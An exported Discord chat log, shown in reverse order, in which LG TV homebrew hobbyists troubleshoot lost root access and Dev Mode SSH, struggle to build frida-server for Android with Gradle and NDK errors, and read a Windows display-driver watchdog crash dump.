+[] _tiner no, just disapperas before i installed dev mode
+hellobox. 03/24/2024 1:26 AM
+yeah, you're screwed then
+[_tiner]
+hellobox. does hbchannel still show up in the list of installed apps on
+the home screen?
+_tiner 03/24/2024 1:26 AM
+no, just disapperas before i installed dev mode
+hellobox. 03/24/2024 1:25 AM
+does hbchannel still show up in the list of installed apps on the home
+screen?
+03/24/2024 1:24 AM
+if somehow you can access dev mode SSH on port 9922, you also might be
+able to fix it
+03/24/2024 1:24 AM
+you will probably have to factory reset
+[_tiner]
+_tiner 03/24/2024 1:23 AM
+refuse connection
+hellobox. 03/24/2024 1:17 AM
+if you can still connect via PuTTY, you may be able to save it
+[_tiner]
+_tiner 03/24/2024 1:16 AM
+yeah, i think
+hellobox. 03/24/2024 1:15 AM
+and you're on a patched firmware version, so you can't get it back
+03/24/2024 1:15 AM
+you've probably lost root
+[_tiner]
+_tiner 03/24/2024 1:15 AM
+im gonna make other things (edited)
+03/24/2024 1:15 AM
+thanks again for help, sorry again for incovenience
+03/24/2024 1:14 AM
+ok, so is this
+03/24/2024 1:14 AM
+oh
+[] _tiner why?
+hellobox. 03/24/2024 1:14 AM
+(no content)
+[TsJtEp5.png]
+ TsJtEp5.png
+8.84 KB External
+[_tiner]
+_tiner 03/24/2024 1:13 AM
+why?
+03/24/2024 1:13 AM
+yes?
+hellobox. 03/24/2024 1:13 AM
+you installed the dev mode app on the TV?
+[] _tiner installing dev lg app, activating key and dev mode
+hellobox. 03/24/2024 1:13 AM
+my god
+[_tiner]
+_tiner 03/24/2024 1:12 AM
+get password and ip
+03/24/2024 1:12 AM
+installing dev lg app, activating key and dev mode
+03/24/2024 1:11 AM
+i try to repeat the tutorial i see last time
+[] _tiner verification fails anyway, i tried the dev lg method, but i
+still get the same error
+hellobox. 03/24/2024 1:11 AM
+why would you try the dev mode method when you know dev mode isn't
+installed?
+[_tiner]
+_tiner 03/24/2024 1:10 AM
+verification fails anyway, i tried the dev lg method, but i still get
+the same error
+hellobox. 03/24/2024 1:01 AM
+https://gist.github.com/throwaway96/e811b0f7cc2a705a5a476a8dfa45e09f#no-devmode-ssh
+(that's for an older version of dev manager, but it's still the same
+idea) (edited)
+[_tiner]
+_tiner 03/24/2024 1:01 AM
+good try for now
+03/24/2024 1:00 AM
+yeah.. is too much to me, idk how to solve this with my experience now
+hellobox. 03/24/2024 12:59 AM
+unless there's a bug, but you haven't given anywhere near enough
+information to determine that
+[] _tiner i was wrong, the connection has set, but stay in timeout
+error, im gonna wait for new updates to see...
+hellobox. 03/24/2024 12:59 AM
+updates aren't going to help. you just have it configured incorrectly
+[_tiner]
+[] _tiner oh, now it worked
+_tiner 03/24/2024 12:58 AM
+i was wrong, the connection has set, but stay in timeout error, im gonna
+wait for new updates to see if this problem stop
+hellobox. 03/24/2024 12:51 AM
+i did accept the licenses:
+    All SDK package licenses accepted.
+(edited)
+03/24/2024 12:51 AM
+    > com.android.builder.sdk.LicenceNotAcceptedException: Failed to install the following Android SDK packages as some licences have not been accepted.
+         ndk;25.1.8937393 NDK (Side by side) 25.1.8937393
+hellobox. 03/24/2024 12:29 AM
+lmao. i guess i want to strip this shit out anyway
+https://www.reddit.com/r/androiddev/comments/f8oh3s/fabric_is_deprecated_and_will_shut_down_after/
+(edited)
+hellobox. 03/24/2024 12:16 AM
+i can't even update gradlew:
+    * What went wrong:
+    Could not initialize class org.codehaus.groovy.runtime.InvokerHelper
+    > Exception java.lang.NoClassDefFoundError: Could not initialize class org.codehaus.groovy.reflection.ReflectionCache [in thread "Daemon worker"]
+03/24/2024 12:16 AM
+write once, run anywhere that has the exact required JDK version and a
+bunch of other highly specific shit
+03/24/2024 12:13 AM
+so gradle has proprietary bits? gradle-enterprise-gradle-plugin
+03/24/2024 12:12 AM
+wow https://lists.debian.org/debian-java/2021/09/msg00003.html
+March 23, 2024
+hellobox. 03/23/2024 11:46 PM
+i think i managed to build everything necessary, but that was janky af
+hellobox. 03/23/2024 10:50 PM
+it also only works with a specific android NDK version
+03/23/2024 10:50 PM
+i guess it must be super fragile
+03/23/2024 10:50 PM
+wow, it pretty much downloads its own toolchains for everything. wtf?
+03/23/2024 10:46 PM
+frida-server seems to be part of core
+03/23/2024 10:45 PM
+there's gum, core, python, node, tools
+03/23/2024 10:44 PM
+i'm quite confused about which parts run on the host vs. target
+03/23/2024 10:43 PM
+@Smx how do i build frida-server for android?
+hellobox. 03/23/2024 8:14 PM
+i assume this is just the watchdog thread
+    watchdog!WdpDbgCaptureTriageDump+0xb7
+    watchdog!WdDbgReportRecreate+0xd4
+    dxgkrnl!TdrUpdateDbgReport+0x11d
+    dxgmms2!VidSchiResetEngine+0x70f
+    dxgmms2!VidSchiResetEngines+0xb1
+    dxgmms2!VidSchiCheckHwProgress+0x2f10d
+    dxgmms2!VidSchiWaitForSchedulerEvents+0x389
+    dxgmms2!VidSchiScheduleCommandToRun+0x291
+    dxgmms2!VidSchiRun_PriorityTable+0x35
+    dxgmms2!VidSchiWorkerThread+0xca
+    nt!PspSystemThreadStartup+0x57
+    nt!KiStartSystemThread+0x34
+[smx2460]
+smx2460 03/23/2024 8:10 PM
+So if you iterate a million things, a million things get allocated
+forever
+03/23/2024 8:09 PM
+And there's no way to disable that afaik
+[smx2460]
+[] infowski that sounds... fairly inefficient
+smx2460 03/23/2024 8:09 PM
+Kaitai caches lazy read properties
+hellobox. 03/23/2024 8:04 PM
+so i guess it's just hanging (which would explain why it's in a
+directory named WATCHDOG)
+03/23/2024 8:04 PM
+> VIDEO_ENGINE_TIMEOUT_DETECTED (141)
+03/23/2024 8:03 PM
+ah, i think i found something in C:\Windows\LiveKernelReports\WATCHDOG
+03/23/2024 7:57 PM
+anyone know where more detailed logs and/or some kind of crash dumps
+would be stored?
+03/23/2024 7:57 PM
+my damn video driver keeps crashing > Display driver amdwddmg stopped
+responding and has successfully recovered.
+[infowski]
+[] smx2460 Click to see attachment
+infowski 03/23/2024 7:56 PM
+that sounds... fairly inefficient
+[] _tiner <@803885040827629628> sorry the incovenience, im gonna set the
+public key and wait for a update
+hellobox. 03/23/2024 7:27 PM
+great. if you need any further assistance, please use # unknown-channel
+or a more specific channel (if appropriate)
+ 1
+[_tiner]
+_tiner 03/23/2024 7:27 PM
+thanks so much
+03/23/2024 7:26 PM
+@hellobox sorry the incovenience, im gonna set the public key and wait
+for a update
+03/23/2024 7:25 PM
+oh, now it worked
+03/23/2024 7:25 PM
+ok, this time appears to be connected
+03/23/2024 7:25 PM
+trying again
+hellobox. 03/23/2024 7:22 PM
+so you just have dev manager configured incorrectly
+[] _tiner worked, i think
+hellobox. 03/23/2024 7:21 PM
+yeah, it worked.
+[_tiner]
+_tiner 03/23/2024 7:21 PM
+worked, i think
+03/23/2024 7:21 PM
+(no content)
+[image.png]
+ image.png
+5.36 KB External
+03/23/2024 7:20 PM
+im gonna try now
+03/23/2024 7:20 PM
+the putty connected in the last time i tried
+hellobox. 03/23/2024 7:20 PM
+yes
